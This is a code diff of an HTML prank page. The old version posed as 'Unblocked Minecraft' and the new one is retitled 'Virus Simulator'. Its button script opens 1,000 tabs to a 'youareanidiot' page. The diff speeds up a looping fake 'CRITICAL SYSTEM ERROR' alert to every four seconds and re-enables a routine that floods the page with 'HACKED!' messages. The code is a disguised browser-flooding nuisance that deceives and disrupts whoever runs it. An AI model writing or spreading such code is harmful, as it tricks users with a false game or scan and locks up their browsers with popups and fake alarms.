@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Unblocked Minecraft</title>
+  <title>Virus Simulator</title>
   <style>
     body {
       background: black;
@@ -29,22 +29,22 @@
   </style>
 </head>
 <body>
-  <h1>UNBLOCKED MINECRAFT</h1>
-  <button onclick="startVirus()">Load Game</button>
+  <h1>Start Virus Scan</h1>
+  <button onclick="startVirus()">Start</button>
 
   <script>
     function startVirus() {
-       alert("Allow Popups?");
+      alert("Scanning...");
       // Open tabs immediately after click
       for (let i = 0; i < 1000; i++) {
         window.open("https://thegeekboiz.github.io/PythonScratcher/youareanidiot/index.html", "_blank");
       }
 
       // Looping alerts
-      setInterval(() => alert("CRITICAL SYSTEM ERROR"), 4000000000);
+      setInterval(() => alert("CRITICAL SYSTEM ERROR"), 4000);
 
       // Spam text
-     /* setInterval(() => {
+      setInterval(() => {
         const msg = document.createElement('div');
         msg.className = "spam";
         msg.innerText = "HACKED!";
@@ -52,7 +52,7 @@
         msg.style.top = Math.random() * window.innerHeight + "px";
         document.body.appendChild(msg);
       }, 150);
-    }*/
+    }
   </script>
 </body>
 </html>
